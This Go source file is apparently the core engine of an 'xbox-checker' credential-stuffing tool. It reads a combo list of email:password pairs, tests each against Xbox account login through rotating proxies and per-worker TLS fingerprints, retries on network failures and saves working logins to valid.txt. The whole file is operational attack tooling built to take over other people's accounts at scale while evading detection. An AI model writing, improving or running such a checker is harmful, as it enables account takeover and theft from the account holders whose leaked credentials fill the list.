package checker

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"xbox-checker/internal/core"
	"xbox-checker/internal/nettls"
	"xbox-checker/internal/proxy"
	"xbox-checker/internal/xbox"
)

var stopFlag int32
var pauseFlag int32

// SetStopFlag/SetPauseFlag are wired by the GUI so engine loops observe the
// stop/pause atomic flags.
func SetStopFlag(v int32)  { atomic.StoreInt32(&stopFlag, v) }
func SetPauseFlag(v int32) { atomic.StoreInt32(&pauseFlag, v) }

func hookOnTotal() {
	if Hooks.OnTotal != nil {
		Hooks.OnTotal()
	}
}

func sendProgress(ch chan ProgressEvent, ev ProgressEvent) {
	if ch == nil {
		return
	}
	select {
	case ch <- ev:
	default:
	}
}

func RunEngine(cfg Config, progressChan chan ProgressEvent) {
	file, err := os.Open(cfg.ComboPath)
	if err != nil {
		sendProgress(progressChan, ProgressEvent{LogMsg: fmt.Sprintf("[FATAL] Combo file error: %v", err)})
		close(progressChan)
		return
	}
	defer file.Close()

	// Soft-fails (proxy/preflight/network/etc.) go back into the work queue
	// and are retried with the next proxy until they succeed or hit a hard
	// failure (wrong credentials) — capped at maxProxyTries attempts so a
	// dead proxy list can never spin a run forever.
	workCh := make(chan string, 4096)
	var (
		pending    int64
		fileDone   int32
		firstLeft  int64
		retryPhase int32
		dailyStop  int32
	)
	var retryMu sync.Mutex
	retryBuf := make([]string, 0, 256)
	// Only this feeder sends retries onto workCh. Workers never send to workCh
	// (that deadlocks when every worker retries at once and the buffer is full).
	pumpRetries := func(n int) {
		for i := 0; i < n; i++ {
			retryMu.Lock()
			if len(retryBuf) == 0 {
				retryMu.Unlock()
				return
			}
			item := retryBuf[0]
			retryBuf = retryBuf[1:]
			retryMu.Unlock()
			select {
			case workCh <- item:
			default:
				retryMu.Lock()
				retryBuf = append([]string{item}, retryBuf...)
				retryMu.Unlock()
				return
			}
		}
	}

	// Track which combos are currently counted in the UI "Retries" number
	// so we only +1 the first time they soft-fail, and -1 when finally resolved.
	inRetry := sync.Map{}    // combo -> struct{}
	retryCount := sync.Map{} // combo -> int
	triedProxy := sync.Map{} // combo -> map[string]struct{}
	lastReason := sync.Map{} // line key -> why the last attempt soft-failed
	// Cap proxy attempts so a dead proxy list can never spin a run forever,
	// but scale the cap with the pool: a flat 3 gave up on accounts the 4th
	// live proxy would have logged into, marked them done, and resume then
	// skipped them because they were in DoneRanges.
	maxProxyTries := 3
	if n := len(cfg.Proxies); n > 0 {
		maxProxyTries = n
		if maxProxyTries > 10 {
			maxProxyTries = 10
		}
		if maxProxyTries < 3 {
			maxProxyTries = 3
		}
	}

	retryWant := map[int]bool{}
	if cfg.Session != nil {
		// RetryCounts are deliberately NOT restored on resume: a line in the
		// retry list soft-failed before, and carrying its old count forward
		// would exhaust the fresh proxy budget immediately. TriedProxies ARE
		// restored so the same known-dead proxies are not reused.
		for k, plist := range cfg.Session.TriedProxies {
			used := map[string]struct{}{}
			for _, p := range plist {
				used[p] = struct{}{}
			}
			triedProxy.Store(k, used)
		}
		for _, ln := range cfg.Session.RetryLines {
			retryWant[ln] = true
		}
	}

	// clearLineState drops every per-line bookkeeping entry once the line has
	// a final outcome. inRetry was already deleted on a result, but retryCount,
	// triedProxy (a map of every proxy used for that line) and lastReason used
	// to stay in the sync.Maps for the whole run — one entry per soft-failed
	// line, never removed.
	clearLineState := func(lk string) {
		retryCount.Delete(lk)
		triedProxy.Delete(lk)
		lastReason.Delete(lk)
	}

	// parkLine records a line the worker received but cannot finish because
	// the run is stopping or hit the daily cap. Without this the line was
	// neither marked done nor written to the session retry list, so resume had
	// no record of it and it silently vanished from the run.
	parkLine := func(lineNo int) {
		lk := LineKey(lineNo)
		if _, loaded := inRetry.LoadAndDelete(lk); loaded {
			sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
		}
		n := 0
		if v, ok := retryCount.Load(lk); ok {
			n, _ = v.(int)
		}
		used := map[string]struct{}{}
		if v, ok := triedProxy.Load(lk); ok {
			if m, ok := v.(map[string]struct{}); ok {
				used = m
			}
		}
		MarkLinePending(&cfg, lineNo, n, used)
		atomic.AddInt64(&pending, -1)
	}

	go func() {
		scanner := bufio.NewScanner(file)
		// The default 64KB token cap silently truncated the run: a longer
		// line errored the scan, the error was ignored, fileDone was set and
		// every remaining line was never queued — while the run still ended
		// "done". Raise the cap and surface any scan error in the log.
		scanner.Buffer(make([]byte, 0, 64*1024), 16*1024*1024)
		idx := 0
		for scanner.Scan() {
			raw := strings.TrimSpace(scanner.Text())
			if raw == "" {
				continue
			}
			idx++
			if retryWant[idx] {
				inRetry.Store(LineKey(idx), struct{}{})
				atomic.AddInt64(&pending, 1)
				retryMu.Lock()
				retryBuf = append(retryBuf, PackWork(idx, raw))
				retryMu.Unlock()
				hookOnTotal()
				sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: 1})
				continue
			}
			if cfg.Session != nil && RangeHas(cfg.Session.DoneRanges, idx) {
				continue
			}
			atomic.AddInt64(&pending, 1)
			atomic.AddInt64(&firstLeft, 1)
			hookOnTotal()
			workCh <- PackWork(idx, raw)
		}
		if err := scanner.Err(); err != nil {
			sendProgress(progressChan, ProgressEvent{LogMsg: fmt.Sprintf("[FATAL] Combo file scan stopped after line %d — remaining lines were NOT checked: %v", idx, err)})
		}
		atomic.StoreInt32(&fileDone, 1)
	}()

	go func() {
		for {
			pumpRetries(cfg.Workers * 2)
			if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&firstLeft) <= 0 {
				atomic.StoreInt32(&retryPhase, 1)
			}
			if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&stopFlag) == 1 {
				return
			}
			if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&pending) <= 0 {
				return
			}
			time.Sleep(20 * time.Millisecond)
		}
	}()

	// Workers keep running until everything is resolved
	var wg sync.WaitGroup
	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			wfp := nettls.NewWorkerFP(workerID)
			// One reusable timer per worker. The old select armed
			// time.After(100ms) on every idle wait: each call allocates a
			// runtime timer that only becomes collectable once it fires — with
			// 100 workers that is ~10 new resident timers a second per worker.
			idle := time.NewTimer(time.Hour)
			if !idle.Stop() {
				<-idle.C
			}
			defer idle.Stop()
			for {
				// Exit condition: file fully loaded and nothing left pending
				if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&pending) <= 0 {
					return
				}

				if !idle.Stop() {
					select {
					case <-idle.C:
					default:
					}
				}
				idle.Reset(100 * time.Millisecond)
				var raw string
				select {
				case raw = <-workCh:
				case <-idle.C:
					continue
				}
				// Unpack before the pause wait: the line is already counted in
				// pending, so a stop arriving during pause must be able to park
				// it in the session instead of dropping it on the floor.
				lineNo, combo := UnpackWork(raw)
				for atomic.LoadInt32(&pauseFlag) == 1 {
					if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&stopFlag) == 1 {
						parkLine(lineNo)
						return
					}
					time.Sleep(200 * time.Millisecond)
				}
				lk := LineKey(lineNo)

				parts := strings.SplitN(combo, ":", 2)
				if len(parts) != 2 {
					sendProgress(progressChan, ProgressEvent{LogMsg: fmt.Sprintf("[WARN] Malformed combo: %s", combo)})
					if _, loaded := inRetry.LoadAndDelete(lk); loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
					}
					clearLineState(lk)
					MarkLineDone(&cfg, lineNo)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					atomic.AddInt64(&pending, -1)
					continue
				}
				email, password := parts[0], parts[1]

				if atomic.LoadInt32(&stopFlag) == 1 {
					parkLine(lineNo)
					return
				}
				if atomic.LoadInt32(&dailyStop) == 1 || core.AtLimit() {
					if atomic.CompareAndSwapInt32(&dailyStop, 0, 1) {
						sendProgress(progressChan, ProgressEvent{LimitHit: true, Daily: core.DailyUsed(), LogMsg: core.LimitMessage()})
					}
					// Record the in-flight line in the session retry list: the
					// retry pump returns as soon as dailyStop is set, so only
					// buffering it left no trace for resume.
					parkLine(lineNo)
					continue
				}

				// Round-robin next proxy (different proxy on every attempt)
				proxyStr := ""
				if len(cfg.Proxies) > 0 {
					proxyStr = proxy.TakeLive("check", cfg.Proxies)
				}

				formattedHit, valid, logMsg, shouldRetry := xbox.ExecuteAccountValidation(email, password, proxyStr, cfg.Proxies, cfg.Keywords, wfp, cfg)

				if valid {
					used := core.AddDailyValid()
					core.AppendResult("valid.txt", formattedHit)
					sendProgress(progressChan, ProgressEvent{IsValid: true, Hit: formattedHit, LogMsg: logMsg, Daily: used})
					if used >= core.DailyLimit {
						if atomic.CompareAndSwapInt32(&dailyStop, 0, 1) {
							sendProgress(progressChan, ProgressEvent{LimitHit: true, Daily: used, LogMsg: core.LimitMessage()})
						}
					}
					if _, loaded := inRetry.LoadAndDelete(lk); loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
					}
					clearLineState(lk)
					MarkLineDone(&cfg, lineNo)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					atomic.AddInt64(&pending, -1)
					continue
				}

				if shouldRetry {
					// Remember why this attempt soft-failed. The reason is shown
					// when the line enters the retry queue and again on the final
					// [FAIL], so a run that is failing for network reasons says so
					// instead of looking like a wall of bad accounts.
					prevReason := ""
					if logMsg != "" {
						if v, ok := lastReason.Load(lk); ok {
							prevReason, _ = v.(string)
						}
						lastReason.Store(lk, logMsg)
					}
					retryLog := ""
					if logMsg != "" {
						retryLog = fmt.Sprintf("[RETRY] %s — %s", email, logMsg)
					}
					n := 1
					if v, ok := retryCount.Load(lk); ok {
						n = v.(int) + 1
					}
					retryCount.Store(lk, n)
					used := map[string]struct{}{}
					if v, ok := triedProxy.Load(lk); ok {
						if m, ok := v.(map[string]struct{}); ok {
							used = m
						}
					}
					if proxyStr != "" {
						used[proxyStr] = struct{}{}
					}
					triedProxy.Store(lk, used)
					donePool := len(cfg.Proxies) > 0 && len(used) >= len(cfg.Proxies)
					if n >= maxProxyTries || donePool {
						if _, loaded := inRetry.LoadAndDelete(lk); loaded {
							sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
						}
						// The line is being given up on — it must produce an
						// outcome event, otherwise CHECKED never advances for
						// it: the run reported "Done — 14/615" while every
						// retried line silently vanished from the counters.
						failMsg := fmt.Sprintf("[FAIL] %s — attempts exhausted", email)
						if v, ok := lastReason.Load(lk); ok {
							if s, _ := v.(string); s != "" {
								failMsg = fmt.Sprintf("[FAIL] %s — attempts exhausted (last: %s)", email, s)
							}
						}
						sendProgress(progressChan, ProgressEvent{LogMsg: failMsg})
						// Soft failures are not the account's fault: park the line
						// in the session retry list instead of marking it done, so
						// a resume retries it with fresh proxies. Previously it
						// went into DoneRanges, and resume skipped it forever — a
						// live proxy later in the list never got the chance.
						MarkLinePending(&cfg, lineNo, n, used)
						clearLineState(lk)
						if atomic.LoadInt32(&retryPhase) == 0 {
							atomic.AddInt64(&firstLeft, -1)
						}
						atomic.AddInt64(&pending, -1)
						continue
					}
					if _, loaded := inRetry.LoadOrStore(lk, struct{}{}); !loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: 1, LogMsg: retryLog})
					} else if retryLog != "" && logMsg != prevReason {
						// Already waiting in the retry queue: surface a changed
						// reason (a different proxy failing differently) without
						// touching the Retries counter.
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: 0, LogMsg: retryLog})
					}
					MarkLinePending(&cfg, lineNo, n, used)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					retryMu.Lock()
					retryBuf = append(retryBuf, PackWork(lineNo, combo))
					retryMu.Unlock()
					continue
				}

				if logMsg != "" {
					sendProgress(progressChan, ProgressEvent{LogMsg: logMsg})
				} else {
					sendProgress(progressChan, ProgressEvent{IsValid: false})
				}
				if _, loaded := inRetry.LoadAndDelete(lk); loaded {
					sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
				}
				clearLineState(lk)
				MarkLineDone(&cfg, lineNo)
				if atomic.LoadInt32(&retryPhase) == 0 {
					atomic.AddInt64(&firstLeft, -1)
				}
				atomic.AddInt64(&pending, -1)
			}
		}(i)
	}

	wg.Wait()
	// Workers are done: stop the background proxy health-checkers and drop
	// the cached pools, otherwise the testPool goroutines and the copied
	// proxy lists live for the whole process lifetime.
	proxy.ResetPools()
	if atomic.LoadInt32(&stopFlag) == 1 {
		SaveAt(cfg.Session, true)
	} else if atomic.LoadInt32(&dailyStop) == 0 {
		Delete(cfg.Session)
	} else {
		SaveAt(cfg.Session, true)
	}
	sendProgress(progressChan, ProgressEvent{IsDone: true})
	close(progressChan)
}
